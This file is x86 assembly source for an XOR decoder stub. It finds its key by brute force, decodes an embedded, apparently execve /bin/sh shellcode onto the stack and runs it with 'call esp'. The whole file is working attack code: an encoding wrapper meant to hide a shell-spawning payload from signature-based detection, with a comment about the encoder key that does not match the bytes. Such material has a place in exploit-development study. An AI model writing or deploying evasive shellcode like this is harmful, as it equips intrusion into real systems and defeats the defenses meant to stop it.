global _start

section .text
_start:
    jmp short shelly ; JMP CALL POP trick

stub:
    pop esi; address of shellcode in memory 
    xor ecx, ecx ; bytes counter 
    xor eax, eax ; eax = 0

findkey:
    inc ecx     ; ecx loops every possible byte. 
    push ecx    ; save ecx so it can be restored later
    xor cl, byte [esi] ; xor cl with the byte pointed by esi, in other words, with the shellcode byte
    cmp cl, 0x90 ; if cl != 0x90 
    pop ecx      ; restore ecx 
    jne findkey  ; try next byte
    
    ;ELSE key found
    
    mov al, cl ; al stores the correct key     
    mov al, cl 
    mov ah, cl 
    mov bx, ax 
    rol eax, 0x10 
    mov ax, bx  ; each byte of EAX is a the byte-key

    mov cl, len ; cl keeps the length of the shellcode and acts as LOOP decreasing counter 
    

    add esi, ecx ; esi stores the shellcode length 
    dec ecx      ; needed for handling the loop below 
decode:
    dec esi      
    dec esi 
    dec esi
    dec esi      ; in this way ESI points to the correct 4-bytes to decode

    dec ecx      
    dec ecx
    dec ecx      ; needed for handling the loop 

    mov ebx, eax        ; save the key  
    xor eax, [esi]      ; decrypt 4 bytes and save it in EAX
    push eax            ; save decrypted bye
    mov eax, ebx        ; restore the key 
    loop decode         ; decrypt until ECX = 0  
    call esp  ; execute the decrypted shellcode! 

shelly:
    call stub
   ; pase below the encoded bytes with encoder.py 0x28
   shellcode: db 0xb9,0x18,0xe9,0x79,0x41,0x06,0x06,0x5a,0x41,0x41,0x06,0x4b,0x40,0x47,0xa0,0xca,0x79,0xa0,0xcb,0x7a,0xa0,0xc8,0x99,0x22,0xe4,0xa9,0xb9,0xb9,0x29
    len equ $-shellcode 
